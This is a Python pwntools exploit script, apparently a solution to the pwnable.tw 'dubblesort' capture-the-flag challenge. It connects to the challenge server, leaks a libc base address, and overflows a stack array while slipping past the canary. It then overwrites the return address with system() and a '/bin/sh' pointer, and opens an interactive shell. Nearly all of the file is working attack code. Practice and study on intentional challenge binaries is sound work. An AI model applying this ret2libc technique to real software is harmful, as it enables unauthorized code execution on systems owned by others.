from pwn import *

e = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e
context.terminal = ["konsole", "-e"]


while True:
    # just keep running this POS until u get shell
    #p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
    p = remote("chall.pwnable.tw", "10101")

    context.log_level="debug"
    #0xf7fd0b13
    gdb.attach(p, """break * 0xf7fd0afe
            break * 0xf7fd0ab3
            c
            x/12wx $esp+0x7c
            """)



    p.recvuntil(":")

    p.sendline("\x69"*4 + "A"*16 + "B"*4)


    p.recvuntil("\n")
    data = "\x00" + p.recv(3)

    print(data)

    libc.address = u32(data) - 0x1b0000


    binsh = next(libc.search("/bin/sh"))

    print("libc base", hex(libc.address))
    print("libc system", hex(libc.sym["system"]))
    print("libc binsh string", hex(binsh))



    p.recvuntil(":")
    p.sendline("51")




    for i in range(10):
        p.recvuntil(":")
        p.sendline("0")




    for i in range(4):
        p.recvuntil(":")
        p.sendline(str(0xffff0000))




    p.recvuntil(":")
    p.sendline(str(libc.sym["system"]))

    p.recvuntil(":")
    p.sendline(str(binsh))

    p.recvuntil(":")
    p.sendline(str(binsh))


    p.recvuntil(":")
    p.sendline("A")



    p.interactive()
    
    p.close()
